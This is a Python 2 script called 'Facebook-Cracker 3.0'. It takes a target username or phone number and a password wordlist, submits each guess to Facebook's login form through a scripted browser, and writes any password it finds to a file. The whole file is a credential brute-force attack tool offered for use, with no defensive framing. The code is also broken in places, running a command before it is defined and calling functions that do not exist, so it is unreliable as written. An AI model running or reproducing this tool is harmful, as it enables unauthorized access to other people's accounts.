#!/usr/bin/env python
def facebook():
    site = 'Facebook'
    attempt=0
    e = os.system(d)
    print ""+G+" "
    d = '''
    {}<><><><><><><><><><><><><><><><><><><><><>{}
    { Facebook-Cracker 3.0| Created by Andrew-El }
    {}<><><><><><><><><><><><><><><><><><><><><>{}
    '''
    url = 'https://www.facebook.com/login.php'
    d
    print '''
    Username or Phone number/email?
    p = phone, u = username
    '''
    pu = raw_input("option:").lower()
    if pu == 'u':
            username = raw_input('Username:')
            ulio = requests.get('https://www.facebook.com/' + username)
            if ulio.status_code == 200:
                    e
                    print "Username Exists!"
            else:
                    print("That doesn't Exist!")
                    sleep(3)
                    e
                    facebook()
                    
    elif pu == 'p':
            username = raw_input(color.BLUE + 'Phone_Number/Email:')
    else:
            print 'not an option'
            sleep(3)
            os.system(d)
            facebook()
    wordliste = raw_input(color.YELLOW + 'PATH to wordlist:' + color.GREEN)
    try:
            wordlister = open(wordliste, 'r')
    except:
            print "list isn't found"
            sleep(3)
            os.system(d)
            facebook()
    print("Default is 4")
    timmir = int(raw_input(color.YELLOW + "delay time between guesses:" + color.GREEN) or 4)
    os.system(d)
    print 'Do you want to save the output to a file?'
    deltaco = raw_input(':')
    os.system(d)
    fil = raw_input(color.YELLOW + 'PATH to output file:' + color.GREEN)
    try:
            fil = open(fil, 'a')
    except:
            os.system(d)
            print "That doesn't exist"
    deltaco = deltaco.lower()
    wordlist = list(wordlister)
    for password in wordlist:
            try:
                    attempt=attempt+1
                    password = password.strip()
                    f = mechanize.Browser()
                    f.set_handle_equiv(True)
                    f.set_handle_referer(True)
                    f.set_handle_robots(False)
                    f.addheaders = [('User-Agent', useragent)]
                    response = f.open(url)
                    f.form = list(f.forms())[0]
                    f.form['email'] = username
                    f.form['pass'] = password
                    f.method = 'POST'
                    response = f.submit()
                    if response.geturl() == 'https://www.facebook.com/':
                            print ""+B+" "
                            print
                            print'[-]=============================[-]'
                            print'[-]Facebook-Cracker|V3.0|Andrew [-]'
                            print'[-]=============================[-]'
                            print'[-]+++++++++++++++++++++++++++++[-]'
                            print('{Username:%s' % username)
                            print('{Wordlist:%s' % wordlist)
                            print('{password:%s' % password)
                            print('{Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + 'Username:' + username + 'Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|'+ 'Username/Phone:' + username + ' Password:' + password + ' Attempt:' + attempt)
                                    print "File saved!"
                                    menuit()
                            if deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                                    
                    elif response.geturl() == 'https://www.facebook.com/checkpoint/?next':
                            print ""+B+" "
                            print'[-]=============================[-]'
                            print'[-]Facebook-Cracker|V3.0|Andrew [-]'
                            print'[-]=============================[-]'
                            print'[-]+++++++++++++++++++++++++++++[-]'

                            print('{Username:%s' % username)
                            print('{Wordlist:%s' % wordliste)
                            print('{password:%s' % password)
                            print('{Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                                    print "File Saved!"
                                    menuit()
                            elif deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                    elif response.geturl() == 'https://www.facebook.com/?sk=welcome':
                            print ""+B+" "
                            print'[-]=============================[-]'
                            print'[-]Facebook-Cracker|V3.0|Andrew [-]'
                            print'[-]=============================[-]'
                            print'[-]+++++++++++++++++++++++++++++[-]'

                            print('{Username:%s' % username)
                            print('{Wordlist:%s' % wordliste)
                            print('{password:%s' % password)
                            print('{Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                                    print "File Saved!"
                                    menuit()
                            elif deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                    else:
                            print ""+B+" "
                            print'[-]=============================[-]'
                            print'[-]Facebook-Cracker|V3.0|Andrew [-]'
                            print'[-]=============================[-]'
                            print response.geturl()
                            print'[-]+++++++++++++++++++++++++++++[-]'
                            print('{Username:%s' % username)
                            print('{Wordlist:%s' % wordliste)
                            print('{password:%s' % password)
                            print('{Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password:%s Does not work!' % password)
                            sleep(timmir)
                            os.system(d)
                            
            except KeyboardInterrupt:kill()
